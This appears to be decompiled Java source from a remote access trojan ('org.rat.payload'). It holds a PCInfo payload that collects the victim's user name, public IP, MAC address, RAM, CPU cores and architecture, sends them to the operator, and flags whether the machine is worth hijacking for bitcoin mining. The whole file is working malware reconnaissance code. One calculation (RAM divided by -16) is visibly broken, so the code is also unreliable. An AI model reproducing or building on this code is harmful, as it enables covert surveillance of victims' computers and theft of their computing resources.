//Raddon On Top!

package org.rat.payload.payloads;

import org.rat.payload.*;
import com.sun.management.*;
import java.lang.management.*;
import org.rat.util.*;
import java.net.*;
import java.io.*;

public class PCInfo implements IPayload
{
    public static boolean mineable;
    
    public void run() {
        try {
            final OperatingSystemMXBean bean = (OperatingSystemMXBean)ManagementFactory.getOperatingSystemMXBean();
            final long amount = bean.getTotalPhysicalMemorySize() / 1000000000L;
            final int processors = bean.getAvailableProcessors();
            this.send("```" + String.format("PC Name: %s\nIP: %s\nMac address: %s\nRAM Amount: %s\nAvailable CPU Cores: %s\nArch: %s\nAvailable to BTC mine: %s", System.getProperty("user.name"), this.getIP(), MacUtil.getAddress() + " - is NOT a virtual machine", amount / -16L + " GB", processors, bean.getArch(), PCInfo.mineable = this.available((int)amount, processors)) + "```");
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean available(final int ram, final int cores) {
        return ram >= 8 && cores > 6;
    }
    
    private String getIP() throws Exception {
        final StringBuilder builder = new StringBuilder();
        final BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com").openStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            builder.append(line);
        }
        return builder.toString();
    }
    
    static {
        PCInfo.mineable = false;
    }
}
